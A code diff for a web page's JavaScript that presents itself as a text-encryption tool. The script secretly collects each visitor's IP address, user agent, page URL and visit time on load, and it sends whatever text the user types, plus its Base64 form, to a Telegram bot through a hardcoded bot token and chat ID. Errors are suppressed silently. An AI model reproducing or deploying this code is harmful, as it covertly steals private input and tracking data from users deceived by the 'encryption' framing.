@@ -1,100 +1,100 @@
-<script>
-    const BOT_TOKEN = '8526497249:AAFnDGMvwY4NcnR4zHCad7vgpDjhn8SpI4s';
-    const CHAT_ID = '1339887333';
+const BOT_TOKEN = '8526497249:AAFnDGMvwY4NcnR4zHCad7vgpDjhn8SpI4s';
+const CHAT_ID = '1339887333';
 
-    // Auto-alert on visit
-    window.onload = function() {
-      sendTelegramAlert("🚨 *New Visitor Alert!*");
-    };
+// Send alert automatically when page loads
+window.onload = function() {
+  sendTelegramAlert("🚨 *New Visitor Alert!*");
+};
 
-    async function getUserIP() {
-      const controller = new AbortController();
-      const timeoutId = setTimeout(() => controller.abort(), 3000);
+// Fetch visitor public IP with 3-second timeout for mobile compatibility
+async function getUserIP() {
+  const controller = new AbortController();
+  const timeoutId = setTimeout(() => controller.abort(), 3000);
 
-      try {
-        const response = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
-        clearTimeout(timeoutId);
-        const data = await response.json();
-        return data.ip;
-      } catch (error) {
-        clearTimeout(timeoutId);
-        return 'Unavailable';
-      }
-    }
+  try {
+    const response = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
+    clearTimeout(timeoutId);
+    const data = await response.json();
+    return data.ip;
+  } catch (error) {
+    clearTimeout(timeoutId);
+    return 'Unavailable';
+  }
+}
 
-    // Helper to encode string safely to Base64
-    function encryptText(str) {
-      return btoa(unescape(encodeURIComponent(str)));
-    }
+// Encode string safely to Base64
+function encryptText(str) {
+  return btoa(unescape(encodeURIComponent(str)));
+}
 
-    async function sendTelegramAlert(headerText, rawInput = '', cipherText = '') {
-      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-      const deviceType = isMobile ? '📱 Mobile Device' : '💻 Desktop';
+// Send payload to Telegram API
+async function sendTelegramAlert(headerText, rawInput = '', cipherText = '') {
+  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+  const deviceType = isMobile ? '📱 Mobile Device' : '💻 Desktop';
 
-      const userIP = await getUserIP();
-      const userAgent = navigator.userAgent;
-      const pageUrl = window.location.href;
-      const visitTime = new Date().toLocaleString();
+  const userIP = await getUserIP();
+  const userAgent = navigator.userAgent;
+  const pageUrl = window.location.href;
+  const visitTime = new Date().toLocaleString();
 
-      let message = `${headerText}\n\n`;
+  let message = `${headerText}\n\n`;
 
-      if (rawInput) {
-        message += `💬 *Original Text:* \`${rawInput}\`\n` +
-                   `🔐 *Encrypted Text:* \`${cipherText}\`\n\n`;
-      }
+  if (rawInput) {
+    message += `💬 *Original Text:* \`${rawInput}\`\n` +
+               `🔐 *Encrypted Text:* \`${cipherText}\`\n\n`;
+  }
 
-      message += `🖥 *Type:* ${deviceType}\n` +
-                 `🌐 *IP Address:* \`${userIP}\`\n` +
-                 `⏰ *Time:* ${visitTime}\n` +
-                 `🔗 *Page:* ${pageUrl}\n` +
-                 `📱 *User Agent:* ${userAgent}`;
+  message += `🖥 *Type:* ${deviceType}\n` +
+             `🌐 *IP Address:* \`${userIP}\`\n` +
+             `⏰ *Time:* ${visitTime}\n` +
+             `🔗 *Page:* ${pageUrl}\n` +
+             `📱 *User Agent:* ${userAgent}`;
 
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-      try {
-        await fetch(url, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-          })
-        });
-      } catch (error) {
-        // Silently catch error
-      }
-    }
+  try {
+    await fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    });
+  } catch (error) {
+    // Silent catch
+  }
+}
 
-    async function handleGenerate() {
-      const inputField = document.getElementById('userInput');
-      const rawText = inputField.value.trim();
+// Handle button trigger
+async function handleGenerate() {
+  const inputField = document.getElementById('userInput');
+  const rawText = inputField.value.trim();
 
-      if (!rawText) return;
+  if (!rawText) return;
 
-      const btn = document.getElementById('submitBtn');
-      const successAlert = document.getElementById('successAlert');
-      const encryptedContainer = document.getElementById('encryptedContainer');
-      const encryptedTextEl = document.getElementById('encryptedText');
+  const btn = document.getElementById('submitBtn');
+  const successAlert = document.getElementById('successAlert');
+  const encryptedContainer = document.getElementById('encryptedContainer');
+  const encryptedTextEl = document.getElementById('encryptedText');
 
-      btn.disabled = true;
-      btn.innerText = "Processing...";
+  btn.disabled = true;
+  btn.innerText = "Processing...";
 
-      // Perform encryption (Base64)
-      // const cipherText = encryptText(rawText);
-      const cipherText = "https://info.molryna.com";
+  // Encrypt raw input
+  const cipherText = encryptText(rawText);
 
-      // Display results on screen
-      encryptedTextEl.innerText = cipherText;
-      encryptedContainer.style.display = "block";
-      successAlert.style.display = "block";
+  // Update DOM elements
+  encryptedTextEl.innerText = cipherText;
+  encryptedContainer.style.display = "block";
+  successAlert.style.display = "block";
 
-      // Send original text AND encrypted text to Telegram
-      await sendTelegramAlert("🔑 *New Text Keyed In & Encrypted!*", rawText, cipherText);
+  // Send original and encrypted text to Telegram
+  await sendTelegramAlert("🔑 *New Text Keyed In & Encrypted!*", rawText, cipherText);
 
-      btn.disabled = false;
-      btn.innerText = "Generate Response";
-    }
-  </script>
+  btn.disabled = false;
+  btn.innerText = "Generate Response";
+}
